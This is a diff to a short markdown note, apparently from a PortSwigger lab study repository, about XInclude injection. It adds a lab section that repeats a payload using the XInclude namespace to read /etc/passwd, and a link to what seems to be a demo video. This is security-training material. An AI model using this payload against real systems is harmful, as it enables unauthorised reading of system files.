@@ -9,4 +9,11 @@ To perform an `XInclude attack`, you need to reference the `XInclude` namespace 
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
+# Lab
+Here is the main payload for lab:
+```bash
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+https://github.com/offensivecyber03/PortSwigger/assets/71892943/3164d536-4e0b-4519-8b6a-bd0a5e5b4c56
+
 
